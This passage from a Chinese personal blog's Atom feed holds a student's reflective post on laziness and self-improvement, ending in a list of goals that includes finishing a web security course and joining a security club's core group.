灌了鸡汤，不过打一个短暂的兴奋剂，过了几天，还是精虫上脑，活如死尸。<br>舒服了太久，不知道自己有多差劲。<br>这半年也眨眼即逝，从开学到现在也忙于进入三叶草小组，也卓有成效，靠着脸皮与努力如愿进入小组，但这几天自己高兴过头不知道自己其实还差太远，万万不可得意忘形。这话也是我的girlfriend在我们吃庆功宴的时候告诉我的警告。<br>每每觉得自己可以接近完工的时候，我心里总会告诉我自己休息一会儿，马上就好了。然后浪费很多时间，而距离真正的完成却差距很多。从而再次理思路，完成这期间花费的时间往往是巨大的。</p><p>大概看了彭哥的博客感触越发深刻，这一年的多的时间里自己真正想要的总会偏移正轨。<br>这一年的懒惰心里尤为可怕，凡事为自己查找借口，凡事为自己解脱多容易啊，不懂装懂多好啊，别人会觉得你多厉害多聪明啊。<br>这些人性的弱点往往在自身的思考之后越发觉得厌恶。</p><p>或许是时候做些改变。<br>或许苦味的生活才是该拥抱的。<br>或许应当用力量固执地强迫自己向前去奋斗，到力尽气竭为止。</p><p>脸上有阳光，脑子里有爱情，灵魂里有进取，这大概是我现在最想要追寻的。</p><p>接下来的生活真的需要不竭的动力去执行<br>我需要做到：<br>1.找回自身的最好的状态，不睡懒觉，不找借口，做最好的自己<br>2.每周连载2篇博客<br>3.学习成绩年级top20，过六级，每两日一份试卷<br>4.认真听取每节课，不浪费一分一秒<br>5.寒假结束之前将安全牛web安全工程师所有内容学完<br>6.下学期进入核心组</p><p>佛曰：精进。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#反思与进取&lt;br&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201711202038_238.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大
      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="思考" scheme="http://0xmj.club/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
</feed>
